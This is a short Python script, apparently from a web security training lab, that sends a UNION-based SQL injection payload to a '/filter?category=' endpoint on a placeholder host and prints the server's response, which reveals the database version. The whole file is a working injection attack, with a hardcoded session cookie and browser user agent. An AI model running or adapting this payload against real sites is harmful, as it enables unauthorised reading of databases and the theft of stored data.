import requests
pathname='/filter?category='
host='YOUR_HOST'
payload="' UNION SELECT null,version() -- -"

headers={
    "Cookie": "session=H7GYCgR3UrYpv8rX0nIJ8DoJckuzcfRw",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

res=requests.get(url="https://"+host+pathname+payload,headers=headers)
print(res.status_code)
print(res.text)